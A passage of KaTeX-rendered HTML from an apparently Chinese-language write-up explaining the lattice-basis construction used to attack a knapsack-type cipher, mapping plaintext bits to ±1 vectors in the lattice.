stretchy="false">)</mo><mo>∈</mo><mi>L</mi><mo stretchy="false">(</mo><mi>B</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msubsup><mi>v</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>∈</mo><mo stretchy="false">{</mo><mn>1</mn><mo separator="true">,</mo><mo>−</mo><mn>1</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">v&#x27; = (v&#x27;_1,...,v&#x27;_2,0)\in L(B),v&#x27;_i = 2v_i-1\\\\即v&#x27; = (v&#x27;_1,...,v&#x27;_2,0)\in L(B),v&#x27;_i\in \{1,-1\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.801892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">2</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span><span class="mspace newline"></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.801892em;vertical-align:0em;"></span><span class="mord cjk_fallback">即</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mclose">}</span></span></span></span></span></p><p><strong>证明过程如下</strong>：</p><ul><li>其实我们一开始只需要造如下的形式的格即可，这种形式其实就是我们的基于密钥和密文造的最初的格。</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>1</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>2</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋱</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mi>n</mi></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>c</mi></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\begin{bmatrix}1      &amp;   0    &amp; \cdots &amp;    0  &amp; a_1 \\0      &amp;   1    &amp; \cdots &amp;    0  &amp; a_2\\\vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots\\0 &amp;    0 &amp; \cdots &amp;    1   &amp; a_n\\0&amp;0 &amp; \cdots &amp;0 &amp;c\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:6.66em;vertical-align:-3.079999999999999em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.555985em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-1.8999750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.4959750000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.0919750000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.6879750000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.283975em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.314965000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.555985000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.240000000000001em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-5.04em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-3.18em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋱</span></span></span><span style="top:-1.9800000000000009em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-0.7800000000000009em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.555985em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-1.8999750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.4959750000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.0919750000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.6879750000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.283975em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.314965000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.555985000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li><p>记每一行为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">B_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，例如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mn>1</mn></msub><mo>=</mo><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>0</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mn>0</mn><mo separator="true">,</mo><msub><mi>a</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">b_1=(1,0,...,0,a_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，其实向量组<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>其实就是格<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><msub><mi>b</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>b</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(b_1,...,b_{n-1})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>的一个基。</p></li><li><p>而明文序列<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mo>=</mo><mo stretchy="false">{</mo><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>v</mi><mi>n</mi></msub><mo stretchy="false">}</mo><mo separator="true">,</mo><msub><mi>v</mi><mi>i</mi></msub><mo>∈</mo><mrow><mn>1</mn><mo separator="true">,</mo><mn>0</mn></mrow></mrow><annotation encoding="application/x-tex">v=\{v_1,v_2,...,v_n\},v_i\in {1,0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span 